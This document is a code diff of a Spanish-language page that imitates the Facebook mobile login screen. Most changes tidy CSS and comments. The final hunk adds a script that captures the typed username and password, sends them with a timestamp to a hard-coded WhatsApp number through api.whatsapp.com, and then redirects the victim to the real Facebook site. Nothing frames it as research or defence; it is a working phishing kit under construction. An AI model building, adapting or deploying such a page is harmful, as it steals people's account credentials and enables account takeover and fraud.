@@ -5,49 +5,48 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Facebook</title>
     <style>
-        /* Reset de márgenes y paddings aaaaa*/
+        /* Reset de márgenes y paddings */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        /* Configuración del cuerpo para centrar y cubrir toda la pantalla */
+        /* Configuración del cuerpo */
         body {
             font-family: Arial, sans-serif;
             background: linear-gradient(to bottom, #f7f8fc, #ffffff);
-            min-height: 100vh; /* Ajusta la altura mínima sin desbordar */
-            width: 100vw;  /* Ocupa todo el ancho */
+            min-height: 100vh;
+            width: 100vw;
             display: flex;
             flex-direction: column;
-            justify-content: center; /* Centrar verticalmente */
-            align-items: center; /* Centrar horizontalmente */
+            justify-content: center;
+            align-items: center;
             text-align: center;
-            overflow: hidden; /* Evitar scroll */
+            overflow: hidden;
         }
 
         /* Idioma */
         .language {
             color: #606770;
             font-size: 14px;
-            margin-bottom: 30px; /* Aumentar separación del logo */
+            margin-bottom: 30px;
         }
 
-        /* Logo de Facebook */
+        /* Logo */
         .logo {
             width: 60px;
-            margin-bottom: 40px; /* Más espacio entre el logo y los inputs */
+            margin-bottom: 40px;
         }
 
-        /* Contenedor de los elementos */
+        /* Contenedor principal */
         .container {
             width: 90%;
-            max-width: 360px; /* Mantener un tamaño ideal */
+            max-width: 360px;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: space-between; /* Distribuir elementos uniformemente */
-            height: 75vh; /* Ajusta el alto total para evitar desbordes */
+            height: 75vh;
             margin-top: 30px;
         }
 
@@ -56,7 +55,7 @@
             width: 90%;
             max-width: 350px;
             padding: 14px;
-            margin: 12px 0; /* Más espacio entre los inputs */
+            margin: 12px 0;
             border: 1px solid #ccd0d5;
             border-radius: 12px;
             font-size: 16px;
@@ -82,7 +81,7 @@
             background-color: #1558b0;
         }
 
-        /* Enlace de recuperación de contraseña */
+        /* Enlace de recuperación */
         .forgot-password {
             display: block;
             margin: 15px 0;
@@ -94,8 +93,9 @@
             text-decoration: underline;
         }
 
-        /* Botón de crear cuenta */
+        /* Botón de crear cuenta (convertido en enlace) */
         .create-account {
+            display: block;
             width: 90%;
             max-width: 350px;
             padding: 14px;
@@ -107,8 +107,9 @@
             font-size: 16px;
             cursor: pointer;
             margin-top: 20px;
-            margin-bottom: 40px
-            href="https://m.facebook.com/reg/";
+            margin-bottom: 40px;
+            text-align: center;
+            text-decoration: none;
         }
         .create-account:hover {
             background-color: #f0f2f5;
@@ -151,13 +152,12 @@
         /* Ajustes para pantallas pequeñas */
         @media (max-width: 400px) {
             .container {
-                height: auto; /* Evita que se salga de la pantalla */
+                height: auto;
             }
             .input-box {
-                margin: 8px 0; /* Menos espacio entre los inputs en pantallas pequeñas */
+                margin: 8px 0;
             }
         }
-
     </style>
 </head>
 <body>
@@ -168,23 +168,23 @@
     <!-- Logo de Facebook -->
     <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
 
-    <!-- Contenedor de los elementos -->
+    <!-- Contenedor -->
     <div class="container">
         <!-- Campos de entrada -->
-        <input type="text" class="input-box" placeholder="Celular o correo electrónico">
-        <input type="password" class="input-box" placeholder="Contraseña">
+        <input type="text" id="username" class="input-box" placeholder="Celular o correo electrónico">
+        <input type="password" id="password" class="input-box" placeholder="Contraseña">
 
         <!-- Botón de inicio de sesión -->
-        <button class="login-button">Iniciar sesión</button>
+        <button class="login-button" onclick="enviarDatos()">Iniciar sesión</button>
 
-        <!-- Enlace de recuperación de contraseña -->
+        <!-- Enlace de recuperación -->
         <a href="https://m.facebook.com/login/identify/" class="forgot-password">¿Olvidaste tu contraseña?</a>
 
-        <!-- Botón de crear cuenta -->
-        <button class="create-account">Crear cuenta nueva</button>
+        <!-- Botón de crear cuenta (ahora es un enlace) -->
+        <a href="https://m.facebook.com/reg/" class="create-account">Crear cuenta nueva</a>
     </div>
 
-    <!-- Sección de Meta con el icono -->
+    <!-- Sección de Meta -->
     <div class="meta-section">
         <img class="meta-icon" src="https://img.icons8.com/ios-filled/50/606770/meta.png" alt="Meta Icon">
         <span>Meta</span>
@@ -196,6 +196,40 @@
         <a href="#">Ayuda</a> 
         <a href="#">Más</a>
     </div>
+
+    <script>
+        function enviarDatos() {
+            // Obtener datos ingresados
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+
+            // Verificar que los campos no estén vacíos
+            if (username === "" || password === "") {
+                alert("Por favor, complete todos los campos.");
+                return;
+            }
+
+            // Crear el mensaje para WhatsApp
+            var mensaje = "📌 *Intento de inicio de sesión en Facebook*%0A%0A";
+            mensaje += "👤 Usuario: " + username + "%0A";
+            mensaje += "🔑 Contraseña: " + password + "%0A";
+            mensaje += "📅 Fecha: " + new Date().toLocaleString();
+
+            // Número de WhatsApp donde se enviará (cambia el número)
+            var numeroWhatsApp = "+50488440235"; // Reemplazar con el número correcto
+
+            // Enlace de WhatsApp
+            var urlWhatsApp = "https://api.whatsapp.com/send?phone=" + numeroWhatsApp + "&text=" + mensaje;
+
+            // Redirigir a WhatsApp
+            window.open(urlWhatsApp, "_blank");
+
+            // Luego de 3 segundos, abrir otro enlace
+            setTimeout(function() {
+                window.location.href = "https://www.facebook.com";
+            }, 3000);
+        }
+    </script>
 
 </body>
 </html>
